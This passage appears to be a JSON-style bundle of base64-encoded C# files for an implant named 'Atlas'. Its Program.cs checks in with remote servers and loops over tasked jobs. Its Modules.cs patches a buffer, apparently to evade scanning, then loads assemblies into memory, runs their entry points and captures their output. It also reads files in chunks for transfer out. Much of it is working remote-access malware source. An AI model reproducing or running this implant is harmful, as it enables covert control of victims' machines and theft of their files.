ICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBQZXJzaXN0S2V5SW5Dc3AgPSBmYWxzZQ0KICAgICAgICAgICAgfTsNCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgYnl0ZVtdIFJzYURlY3J5cHQoYnl0ZVtdIERhdGEpDQogICAgICAgIHsNCiAgICAgICAgICAgIENvbmZpZy5Sc2EuSW1wb3J0UGFyYW1ldGVycyhDb25maWcuUnNhLkV4cG9ydFBhcmFtZXRlcnModHJ1ZSkpOw0KICAgICAgICAgICAgYnl0ZVtdIGZpbmFsID0gQ29uZmlnLlJzYS5EZWNyeXB0KERhdGEsIHRydWUpOw0KICAgICAgICAgICAgcmV0dXJuIGZpbmFsOw0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgR2V0UHViS2V5KCkNCiAgICAgICAgew0KICAgICAgICAgICAgU3RyaW5nV3JpdGVyIG91dFN0cmVhbSA9IG5ldyBTdHJpbmdXcml0ZXIoKTsNCiAgICAgICAgICAgIEV4cG9ydFB1YmxpY0tleShDb25maWcuUnNhLCBvdXRTdHJlYW0pOw0KICAgICAgICAgICAgcmV0dXJuIENvbnZlcnQuVG9CYXNlNjRTdHJpbmcoRW5jb2RpbmcuVVRGOC5HZXRCeXRlcyhvdXRTdHJlYW0uVG9TdHJpbmcoKSkpOw0KICAgICAgICB9DQoNCiAgICAgICAgLy8gaHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvMjg0MDY4ODgvYy1zaGFycC1yc2EtcHVibGljLWtleS1vdXRwdXQtbm90LWNvcnJlY3QvMjg0MDc2OTMjMjg0MDc2OTMNCiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgdm9pZCBFeHBvcnRQdWJsaWNLZXkoUlNBQ3J5cHRvU2VydmljZVByb3ZpZGVyIGNzcCwgVGV4dFdyaXRlciBvdXRwdXRTdHJlYW0pDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciBwYXJhbWV0ZXJzID0gY3NwLkV4cG9ydFBhcmFtZXRlcnMoZmFsc2UpOw0KICAgICAgICAgICAgdXNpbmcgKHZhciBzdHJlYW0gPSBuZXcgTWVtb3J5U3RyZWFtKCkpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdmFyIHdyaXRlciA9IG5ldyBCaW5hcnlXcml0ZXIoc3RyZWFtKTsNCiAgICAgICAgICAgICAgICB3cml0ZXIuV3JpdGUoKGJ5dGUpMHgzMCk7IC8vIFNFUVVFTkNFDQogICAgICAgICAgICAgICAgdXNpbmcgKHZhciBpbm5lclN0cmVhbSA9IG5ldyBNZW1vcnlTdHJlYW0oKSkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHZhciBpbm5lcldyaXRlciA9IG5ldyBCaW5hcnlXcml0ZXIoaW5uZXJTdHJlYW0pOw0KICAgICAgICAgICAgICAgICAgICBpbm5lcldyaXRlci5Xcml0ZSgoYnl0ZSkweDMwKTsgLy8gU0VRVUVOQ0UNCiAgICAgICAgICAgICAgICAgICAgRW5jb2RlTGVuZ3RoKGlubmVyV3JpdGVyLCAxMyk7DQogICAgICAgICAgICAgICAgICAgIGlubmVyV3JpdGVyLldyaXRlKChieXRlKTB4MDYpOyAvLyBPQkpFQ1QgSURFTlRJRklFUg0KICAgICAgICAgICAgICAgICAgICB2YXIgcnNhRW5jcnlwdGlvbk9pZCA9IG5ldyBieXRlW10geyAweDJhLCAweDg2LCAweDQ4LCAweDg2LCAweGY3LCAweDBkLCAweDAxLCAweDAxLCAweDAxIH07DQogICAgICAgICAgICAgICAgICAgIEVuY29kZUxlbmd0aChpbm5lcldyaXRlciwgcnNhRW5jcnlwdGlvbk9pZC5MZW5ndGgpOw0KICAgICAgICAgICAgICAgICAgICBpbm5lcldyaXRlci5Xcml0ZShyc2FFbmNyeXB0aW9uT2lkKTsNCiAgICAgICAgICAgICAgICAgICAgaW5uZXJXcml0ZXIuV3JpdGUoKGJ5dGUpMHgwNSk7IC8vIE5VTEwNCiAgICAgICAgICAgICAgICAgICAgRW5jb2RlTGVuZ3RoKGlubmVyV3JpdGVyLCAwKTsNCiAgICAgICAgICAgICAgICAgICAgaW5uZXJXcml0ZXIuV3JpdGUoKGJ5dGUpMHgwMyk7IC8vIEJJVCBTVFJJTkcNCiAgICAgICAgICAgICAgICAgICAgdXNpbmcgKHZhciBiaXRTdHJpbmdTdHJlYW0gPSBuZXcgTWVtb3J5U3RyZWFtKCkpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBiaXRTdHJpbmdXcml0ZXIgPSBuZXcgQmluYXJ5V3JpdGVyKGJpdFN0cmluZ1N0cmVhbSk7DQogICAgICAgICAgICAgICAgICAgICAgICBiaXRTdHJpbmdXcml0ZXIuV3JpdGUoKGJ5dGUpMHgwMCk7IC8vICMgb2YgdW51c2VkIGJpdHMNCiAgICAgICAgICAgICAgICAgICAgICAgIGJpdFN0cmluZ1dyaXRlci5Xcml0ZSgoYnl0ZSkweDMwKTsgLy8gU0VRVUVOQ0UNCiAgICAgICAgICAgICAgICAgICAgICAgIHVzaW5nICh2YXIgcGFyYW1zU3RyZWFtID0gbmV3IE1lbW9yeVN0cmVhbSgpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBwYXJhbXNXcml0ZXIgPSBuZXcgQmluYXJ5V3JpdGVyKHBhcmFtc1N0cmVhbSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgRW5jb2RlSW50ZWdlckJpZ0VuZGlhbihwYXJhbXNXcml0ZXIsIHBhcmFtZXRlcnMuTW9kdWx1cyk7IC8vIE1vZHVsdXMNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbmNvZGVJbnRlZ2VyQmlnRW5kaWFuKHBhcmFtc1dyaXRlciwgcGFyYW1ldGVycy5FeHBvbmVudCk7IC8vIEV4cG9uZW50DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIHBhcmFtc0xlbmd0aCA9IChpbnQpcGFyYW1zU3RyZWFtLkxlbmd0aDsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbmNvZGVMZW5ndGgoYml0U3RyaW5nV3JpdGVyLCBwYXJhbXNMZW5ndGgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJpdFN0cmluZ1dyaXRlci5Xcml0ZShwYXJhbXNTdHJlYW0uR2V0QnVmZmVyKCksIDAsIHBhcmFtc0xlbmd0aCk7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICB2YXIgYml0U3RyaW5nTGVuZ3RoID0gKGludCliaXRTdHJpbmdTdHJlYW0uTGVuZ3RoOw0KICAgICAgICAgICAgICAgICAgICAgICAgRW5jb2RlTGVuZ3RoKGlubmVyV3JpdGVyLCBiaXRTdHJpbmdMZW5ndGgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgaW5uZXJXcml0ZXIuV3JpdGUoYml0U3RyaW5nU3RyZWFtLkdldEJ1ZmZlcigpLCAwLCBiaXRTdHJpbmdMZW5ndGgpOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIHZhciBsZW5ndGggPSAoaW50KWlubmVyU3RyZWFtLkxlbmd0aDsNCiAgICAgICAgICAgICAgICAgICAgRW5jb2RlTGVuZ3RoKHdyaXRlciwgbGVuZ3RoKTsNCiAgICAgICAgICAgICAgICAgICAgd3JpdGVyLldyaXRlKGlubmVyU3RyZWFtLkdldEJ1ZmZlcigpLCAwLCBsZW5ndGgpOw0KICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgIHZhciBiYXNlNjQgPSBDb252ZXJ0LlRvQmFzZTY0U3RyaW5nKHN0cmVhbS5HZXRCdWZmZXIoKSwgMCwgKGludClzdHJlYW0uTGVuZ3RoKS5Ub0NoYXJBcnJheSgpOw0KICAgICAgICAgICAgICAgIG91dHB1dFN0cmVhbS5Xcml0ZUxpbmUoIi0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tIik7DQogICAgICAgICAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCBiYXNlNjQuTGVuZ3RoOyBpICs9IDY0KQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgb3V0cHV0U3RyZWFtLldyaXRlTGluZShiYXNlNjQsIGksIE1hdGguTWluKDY0LCBiYXNlNjQuTGVuZ3RoIC0gaSkpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBvdXRwdXRTdHJlYW0uV3JpdGVMaW5lKCItLS0tLUVORCBQVUJMSUMgS0VZLS0tLS0iKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHByaXZhdGUgc3RhdGljIHZvaWQgRW5jb2RlTGVuZ3RoKEJpbmFyeVdyaXRlciBzdHJlYW0sIGludCBsZW5ndGgpDQogICAgICAgIHsNCiAgICAgICAgICAgIGlmIChsZW5ndGggPCAwKSB0aHJvdyBuZXcgQXJndW1lbnRPdXRPZlJhbmdlRXhjZXB0aW9uKCJsZW5ndGgiLCAiTGVuZ3RoIG11c3QgYmUgbm9uLW5lZ2F0aXZlIik7DQogICAgICAgICAgICBpZiAobGVuZ3RoIDwgMHg4MCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAvLyBTaG9ydCBmb3JtDQogICAgICAgICAgICAgICAgc3RyZWFtLldyaXRlKChieXRlKWxlbmd0aCk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgLy8gTG9uZyBmb3JtDQogICAgICAgICAgICAgICAgdmFyIHRlbXAgPSBsZW5ndGg7DQogICAgICAgICAgICAgICAgdmFyIGJ5dGVzUmVxdWlyZWQgPSAwOw0KICAgICAgICAgICAgICAgIHdoaWxlICh0ZW1wID4gMCkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHRlbXAgPj49IDg7DQogICAgICAgICAgICAgICAgICAgIGJ5dGVzUmVxdWlyZWQrKzsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgc3RyZWFtLldyaXRlKChieXRlKShieXRlc1JlcXVpcmVkIHwgMHg4MCkpOw0KICAgICAgICAgICAgICAgIGZvciAodmFyIGkgPSBieXRlc1JlcXVpcmVkIC0gMTsgaSA+PSAwOyBpLS0pDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBzdHJlYW0uV3JpdGUoKGJ5dGUpKGxlbmd0aCA+PiAoOCAqIGkpICYgMHhmZikpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHByaXZhdGUgc3RhdGljIHZvaWQgRW5jb2RlSW50ZWdlckJpZ0VuZGlhbihCaW5hcnlXcml0ZXIgc3RyZWFtLCBieXRlW10gdmFsdWUsIGJvb2wgZm9yY2VVbnNpZ25lZCA9IHRydWUpDQogICAgICAgIHsNCiAgICAgICAgICAgIHN0cmVhbS5Xcml0ZSgoYnl0ZSkweDAyKTsgLy8gSU5URUdFUg0KICAgICAgICAgICAgdmFyIHByZWZpeFplcm9zID0gMDsNCiAgICAgICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgdmFsdWUuTGVuZ3RoOyBpKyspDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaWYgKHZhbHVlW2ldICE9IDApIGJyZWFrOw0KICAgICAgICAgICAgICAgIHByZWZpeFplcm9zKys7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBpZiAodmFsdWUuTGVuZ3RoIC0gcHJlZml4WmVyb3MgPT0gMCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBFbmNvZGVMZW5ndGgoc3RyZWFtLCAxKTsNCiAgICAgICAgICAgICAgICBzdHJlYW0uV3JpdGUoKGJ5dGUpMCk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaWYgKGZvcmNlVW5zaWduZWQgJiYgdmFsdWVbcHJlZml4WmVyb3NdID4gMHg3ZikNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIC8vIEFkZCBhIHByZWZpeCB6ZXJvIHRvIGZvcmNlIHVuc2lnbmVkIGlmIHRoZSBNU0IgaXMgMQ0KICAgICAgICAgICAgICAgICAgICBFbmNvZGVMZW5ndGgoc3RyZWFtLCB2YWx1ZS5MZW5ndGggLSBwcmVmaXhaZXJvcyArIDEpOw0KICAgICAgICAgICAgICAgICAgICBzdHJlYW0uV3JpdGUoKGJ5dGUpMCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIEVuY29kZUxlbmd0aChzdHJlYW0sIHZhbHVlLkxlbmd0aCAtIHByZWZpeFplcm9zKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZm9yICh2YXIgaSA9IHByZWZpeFplcm9zOyBpIDwgdmFsdWUuTGVuZ3RoOyBpKyspDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBzdHJlYW0uV3JpdGUodmFsdWVbaV0pOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KI2VuZGlmDQogICAgfQ0KfQ0K"},{"Program.cs":"77u\/bmFtZXNwYWNlIEF0bGFzDQp7DQogICAgY2xhc3MgUHJvZ3JhbQ0KICAgIHsNCiAgICAgICAgcHVibGljIHN0YXRpYyB2b2lkIE1haW4oc3RyaW5nW10gYXJncykNCiAgICAgICAgew0KICAgICAgICAgICAgVXRpbHMuR2V0U2VydmVycygpOw0KICAgICAgICAgICAgd2hpbGUgKCFIdHRwLkNoZWNrSW4oKSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpbnQgRHdlbGwgPSBVdGlscy5HZXREd2VsbFRpbWUoKTsNCiAgICAgICAgICAgICAgICBTeXN0ZW0uVGhyZWFkaW5nLlRocmVhZC5TbGVlcChEd2VsbCk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBVdGlscy5Kb2JMaXN0IEpvYkxpc3QgPSBuZXcgVXRpbHMuSm9iTGlzdA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGpvYl9jb3VudCA9IDAsDQogICAgICAgICAgICAgICAgam9icyA9IHsgfQ0KICAgICAgICAgICAgfTsNCiAgICAgICAgICAgIHdoaWxlICh0cnVlKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIFV0aWxzLkxvb3AoSm9iTGlzdCk7DQogICAgICAgICAgICAgICAgaW50IER3ZWxsID0gVXRpbHMuR2V0RHdlbGxUaW1lKCk7DQogICAgICAgICAgICAgICAgU3lzdGVtLlRocmVhZGluZy5UaHJlYWQuU2xlZXAoRHdlbGwpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KfQ0K"},{"Modules.cs":"77u\/dXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLlRleHQ7DQp1c2luZyBTeXN0ZW0uUmVmbGVjdGlvbjsNCnVzaW5nIFN5c3RlbS5JTzsNCnVzaW5nIFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljOw0KdXNpbmcgU3lzdGVtLkxpbnE7DQp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7DQoNCm5hbWVzcGFjZSBBdGxhcw0Kew0KICAgIGNsYXNzIE1vZHVsZXMNCiAgICB7DQogICAgICAgIHB1YmxpYyBzdGF0aWMgYm9vbCBDaGVjayhzdHJpbmcgRmlsZUlkKQ0KICAgICAgICB7DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBib29sIGEgPSBDb25maWcuTW9kdWxlcy5Db250YWluc0tleShGaWxlSWQpOw0KICAgICAgICAgICAgICAgIHJldHVybiBhOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2gNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBHZXRGdWxsTmFtZShzdHJpbmcgRmlsZUlkKQ0KICAgICAgICB7DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpZiAoQ2hlY2soRmlsZUlkKSkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHN0cmluZyBGdWxsTmFtZSA9IENvbmZpZy5Nb2R1bGVzW0ZpbGVJZF07DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBGdWxsTmFtZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICIiOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmV0dXJuICIiOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgTGlzdEFzc2VtYmxpZXMoKQ0KICAgICAgICB7DQogICAgICAgICAgICBzdHJpbmcgQXNzZW1ibHlMaXN0ID0gIiI7DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBmb3JlYWNoIChLZXlWYWx1ZVBhaXI8c3RyaW5nLCBzdHJpbmc+IEVudHJ5IGluIENvbmZpZy5Nb2R1bGVzKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgc3RyaW5nIE1vZHVsZSA9IEVuY29kaW5nLlVURjguR2V0U3RyaW5nKENvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhFbnRyeS5WYWx1ZSkpOw0KICAgICAgICAgICAgICAgICAgICBzdHJpbmdbXSBBc3NlbWJseSA9IE1vZHVsZS5TcGxpdCgnLCcpOw0KICAgICAgICAgICAgICAgICAgICBBc3NlbWJseUxpc3QgKz0gQXNzZW1ibHlbMF0gKyAnXG4nOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICByZXR1cm4gQXNzZW1ibHlMaXN0Ow0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2gNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gQXNzZW1ibHlMaXN0ID0gIiI7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgc3RhdGljIGJvb2wgTG9hZChzdHJpbmcgRmlsZUlkLHN0cmluZyBCNjRBc3NlbWJseSkNCiAgICAgICAgew0KICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaWYgKENoZWNrKEZpbGVJZCkpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIFBhdGNoQnVmZmVyKCk7DQogICAgICAgICAgICAgICAgICAgIHZhciBhID0gQXNzZW1ibHkuTG9hZChDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoQjY0QXNzZW1ibHkpKTsNCiAgICAgICAgICAgICAgICAgICAgc3RyaW5nIGZ1bGxuYW1lID0gQ29udmVydC5Ub0Jhc2U2NFN0cmluZyhFbmNvZGluZy5VVEY4LkdldEJ5dGVzKGEuRnVsbE5hbWUpKTsNCiAgICAgICAgICAgICAgICAgICAgQ29uZmlnLk1vZHVsZXMuQWRkKEZpbGVJZCwgZnVsbG5hbWUpOw0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjYXRjaA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIEludm9rZShzdHJpbmcgRmlsZUlkLCBzdHJpbmdbXSBhcmdzKQ0KICAgICAgICB7DQogICAgICAgICAgICBzdHJpbmcgb3V0cHV0ID0gIiI7DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBzdHJpbmcgRnVsbE5hbWUgPSBHZXRGdWxsTmFtZShGaWxlSWQpOw0KICAgICAgICAgICAgICAgIEFzc2VtYmx5W10gYXNzZW1zID0gQXBwRG9tYWluLkN1cnJlbnREb21haW4uR2V0QXNzZW1ibGllcygpOw0KICAgICAgICAgICAgICAgIGZvcmVhY2ggKEFzc2VtYmx5IGFzc2VtIGluIGFzc2VtcykNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGlmIChhc3NlbS5GdWxsTmFtZSA9PSBFbmNvZGluZy5VVEY4LkdldFN0cmluZyhDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoRnVsbE5hbWUpKSkNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgTWV0aG9kSW5mbyBlbnRyeXBvaW50ID0gYXNzZW0uRW50cnlQb2ludDsNCiAgICAgICAgICAgICAgICAgICAgICAgIG9iamVjdFtdIGFyZyA9IG5ldyBvYmplY3RbXSB7IGFyZ3MgfTsNCg0KICAgICAgICAgICAgICAgICAgICAgICAgVGV4dFdyaXRlciByZWFsU3RkT3V0ID0gQ29uc29sZS5PdXQ7DQogICAgICAgICAgICAgICAgICAgICAgICBUZXh0V3JpdGVyIHJlYWxTdGRFcnIgPSBDb25zb2xlLkVycm9yOw0KICAgICAgICAgICAgICAgICAgICAgICAgVGV4dFdyaXRlciBzdGRPdXRXcml0ZXIgPSBuZXcgU3RyaW5nV3JpdGVyKCk7DQogICAgICAgICAgICAgICAgICAgICAgICBUZXh0V3JpdGVyIHN0ZEVycldyaXRlciA9IG5ldyBTdHJpbmdXcml0ZXIoKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIENvbnNvbGUuU2V0T3V0KHN0ZE91dFdyaXRlcik7DQogICAgICAgICAgICAgICAgICAgICAgICBDb25zb2xlLlNldEVycm9yKHN0ZEVycldyaXRlcik7DQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGVudHJ5cG9pbnQuSW52b2tlKG51bGwsIGFyZyk7DQoNCiAgICAgICAgICAgICAgICAgICAgICAgIENvbnNvbGUuT3V0LkZsdXNoKCk7DQogICAgICAgICAgICAgICAgICAgICAgICBDb25zb2xlLkVycm9yLkZsdXNoKCk7DQogICAgICAgICAgICAgICAgICAgICAgICBDb25zb2xlLlNldE91dChyZWFsU3RkT3V0KTsNCiAgICAgICAgICAgICAgICAgICAgICAgIENvbnNvbGUuU2V0RXJyb3IocmVhbFN0ZEVycik7DQoNCiAgICAgICAgICAgICAgICAgICAgICAgIG91dHB1dCA9IHN0ZE91dFdyaXRlci5Ub1N0cmluZygpOw0KICAgICAgICAgICAgICAgICAgICAgICAgb3V0cHV0ICs9IHN0ZEVycldyaXRlci5Ub1N0cmluZygpOw0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgcmV0dXJuIG91dHB1dDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmV0dXJuIG91dHB1dDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgYnl0ZVtdIEdldEFzc2VtYmx5KExpc3Q8c3RyaW5nPiBDaHVua3MsIGludCBUb3RhbENodW5rcykNCiAgICAgICAgew0KICAgICAgICAgICAgYnl0ZVtdIEZpbmFsQXNzZW1ibHkgPSBuZXcgYnl0ZVtdIHsgfTsNCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGJ5dGVbXVtdIEFzc2VtYmx5QXJyYXkgPSBuZXcgYnl0ZVtUb3RhbENodW5rc11bXTsNCiAgICAgICAgICAgICAgICBmb3JlYWNoIChzdHJpbmcgY2h1bmsgaW4gQ2h1bmtzKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgaW50IGluZGV4ID0gQ2h1bmtzLkluZGV4T2YoY2h1bmspOw0KICAgICAgICAgICAgICAgICAgICBBc3NlbWJseUFycmF5W2luZGV4XSA9IENvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhjaHVuayk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIEZpbmFsQXNzZW1ibHkgPSBDb21iaW5lKEFzc2VtYmx5QXJyYXkpOw0KICAgICAgICAgICAgICAgIHJldHVybiBGaW5hbEFzc2VtYmx5Ow0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2gNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gRmluYWxBc3NlbWJseTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgYnl0ZVtdIENvbWJpbmUocGFyYW1zIGJ5dGVbXVtdIGFycmF5cykNCiAgICAgICAgew0KICAgICAgICAgICAgYnl0ZVtdIHJ2ID0gbmV3IGJ5dGVbYXJyYXlzLlN1bShhID0+IGEuTGVuZ3RoKV07DQogICAgICAgICAgICBpbnQgb2Zmc2V0ID0gMDsNCiAgICAgICAgICAgIGZvcmVhY2ggKGJ5dGVbXSBhcnJheSBpbiBhcnJheXMpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgQnVmZmVyLkJsb2NrQ29weShhcnJheSwgMCwgcnYsIG9mZnNldCwgYXJyYXkuTGVuZ3RoKTsNCiAgICAgICAgICAgICAgICBvZmZzZXQgKz0gYXJyYXkuTGVuZ3RoOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuIHJ2Ow0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBjbGFzcyBEb3dubG9hZA0KICAgICAgICB7DQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIHVsb25nIEdldFRvdGFsQ2h1bmtzKHN0cmluZyBGaWxlKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHZhciBmaSA9IG5ldyBGaWxlSW5mbyhGaWxlKTsNCiAgICAgICAgICAgICAgICB1bG9uZyB0b3RhbF9jaHVua3MgPSAodWxvbmcpKGZpLkxlbmd0aCArIENvbmZpZy5DaHVua1NpemUgLSAxKSAvIENvbmZpZy5DaHVua1NpemU7DQogICAgICAgICAgICAgICAgcmV0dXJuIHRvdGFsX2NodW5rczsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBsb25nIEdldEZpbGVTaXplKHN0cmluZyBGaWxlKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHZhciBmaSA9IG5ldyBGaWxlSW5mbyhGaWxlKTsNCiAgICAgICAgICAgICAgICByZXR1cm4gZmkuTGVuZ3RoOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBHZXRQYXRoKHN0cmluZyBGaWxlKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHJldHVybiBQYXRoLkdldEZ1bGxQYXRoKEZpbGUpOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBHZXRDaHVuayhzdHJpbmcgRmlsZSwgaW50IENodW5rTnVtLCBpbnQgVG90YWxDaHVua3MsIGxvbmcgRmlsZVNpemUpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBieXRlW10gZmlsZV9jaHVuayA9IG51bGw7DQogICAgICAgICAgICAgICAgICAgIGxvbmcgcG9zID0gQ2h1bmtOdW0gKiBDb25maWcuQ2h1bmtTaXplOw0KICAgICAgICAgICAgICAgICAgICB1c2luZyAoRmlsZVN0cmVhbSBmaWxlU3RyZWFtID0gbmV3IEZpbGVTdHJlYW0oRmlsZSwgRmlsZU1vZGUuT3BlbikpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVTdHJlYW0uUG9zaXRpb24gPSBwb3M7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoVG90YWxDaHVua3MgPT0gQ2h1bmtOdW0gKyAxKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfY2h1bmsgPSBuZXcgYnl0ZVtGaWxlU2l6ZSAtIChDaHVua051bSAqIENvbmZpZy5DaHVua1